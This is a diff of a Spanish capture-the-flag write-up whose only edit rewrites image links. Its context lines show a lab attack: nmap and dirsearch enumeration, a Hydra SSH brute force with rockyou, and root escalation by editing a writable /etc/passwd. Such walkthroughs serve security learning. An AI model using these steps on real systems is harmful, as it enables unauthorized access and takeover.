@@ -22,7 +22,7 @@ nmap -p- -sS --min-rate 5000 -n -vvv -Pn -sC -sV -oN ports 172.17.0.2
 
 **Resultados obtenidos:**
 
-![[IMG-20260625194805930.png]]
+![](IMG-20260625194805930.png)
 
 #### Análisis de Puertos:
 
@@ -40,7 +40,7 @@ Accedemos al servicio web para verificar el contenido disponible de forma públi
 http://172.17.0.2:8080
 ```
 
-![[IMG-20260625194806172.png]]
+![](IMG-20260625194806172.png)
 
 Al inspeccionar visualmente y revisar el código fuente, se identifican las rutas `/panel`, `/upload`, `/download` y `/admin`. Sin embargo, ninguna de ellas muestra información expuesta a simple vista.
 
@@ -51,7 +51,7 @@ Procedemos a realizar **fuzzing** con la herramienta `dirsearch` para buscar pá
 dirsearch -u http://172.17.0.2:8080/admin/ --exclude-status 403,404,500 -e php,txt,html
 ```
 
-![[IMG-20260625194806244.png]]
+![](IMG-20260625194806244.png)
 
 
 **Hallazgo:** Descubrimos el archivo crítico `admin/users.txt`. Al visitarlo, encontramos una lista potencial de usuarios del sistema:
@@ -60,7 +60,7 @@ dirsearch -u http://172.17.0.2:8080/admin/ --exclude-status 403,404,500 -e php,t
 http://172.17.0.2:8080/admin/users.txt
 ```
 
-![[IMG-20260625194806300.png]]
+![](IMG-20260625194806300.png)
 
 ## Fase 2: Explotación (Acceso Inicial)
 
@@ -73,7 +73,7 @@ Con la lista de usuarios obtenida (`users.txt`), utilizamos `Hydra` combinada co
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64 -f
 ```
 
-![[IMG-20260625194806398.png]]
+![](IMG-20260625194806398.png)
   
 **Credenciales válidas encontradas:**
 
@@ -91,7 +91,7 @@ ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
 ssh Thor@172.17.0.2
 ```
 
-![[IMG-20260625194806458.png]]
+![](IMG-20260625194806458.png)
 
 ### Enumeración del Sistema
 
@@ -108,7 +108,7 @@ Una vez dentro del sistema como el usuario `Thor`, realizamos las comprobaciones
 find / -perm -4000 2>/dev/null
 ```
  
-![[IMG-20260625194806524.png]]
+![](IMG-20260625194806524.png)
 
 El binario `/usr/bin/passwd` tiene el bit SUID activado, lo cual es normal, pero al revisar detalladamente los permisos de los archivos de configuración del sistema operativo, detectamos una **grave mala configuración** en el archivo `/etc/passwd`:
 
@@ -118,7 +118,7 @@ ls -la /etc/passwd
 
 **Salida:**
 
-![[IMG-20260625194806626.png]]
+![](IMG-20260625194806626.png)
 
 **Vulnerabilidad Crítica:** El archivo `/etc/passwd` pertenece al grupo `Thor` y cuenta con **permisos de escritura** (`-rw-rw-r--`). Al verificar nuestro ID actual (`id`), confirmamos que pertenecemos a dicho grupo, por lo que podemos editar este archivo directamente.
 
@@ -150,7 +150,7 @@ Sustituimos la `x` de la línea correspondiente a root (la cual indica que la co
 root:[NUESTRO_HASH_GENERADO]:0:0:root:/root:/bin/bash
 ```
 
-![[IMG-20260625194806688.png]]
+![](IMG-20260625194806688.png)
 
 3. **Migración a Root:** Finalmente, nos autenticamos localmente como el usuario administrador utilizando la contraseña definida:
 
@@ -159,9 +159,9 @@ su root
 # Password: 1234
 ```
  
-![[IMG-20260625194806756.png]]
+![](IMG-20260625194806756.png)
 
-![[IMG-20260625195910016.png]]
+![](IMG-20260625195910016.png)
 
 ¡Control total del sistema alcanzado con éxito! **¡Máquina comprometida como ROOT!**
 
